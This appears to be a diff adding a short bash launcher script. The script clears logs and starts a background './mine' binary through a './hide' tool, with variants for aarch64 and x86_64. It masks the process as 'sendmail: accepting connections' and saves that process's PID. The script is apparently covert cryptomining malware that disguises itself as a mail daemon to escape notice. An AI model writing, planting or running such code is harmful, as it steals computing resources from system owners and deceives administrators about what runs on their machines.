@@ -1,0 +1,12 @@
+#!/bin/bash
+`pwd`/init
+>logs
+OS=`uname -m`
+HIDE="sendmail: accepting connections"
+if [ "$OS" == "aarch64" ];   then
+        ./hide -s "$HIDE" ./mine --daemonized >>/dev/null &
+fi
+if [ "$OS" == "x86_64" ];   then
+        ./hide -s "$HIDE" ./mine >>/dev/null &
+fi
+ps -ef|grep "sendmail: accepting connections"|grep -v grep|awk '{print $2}'|head -1 > ra.pid
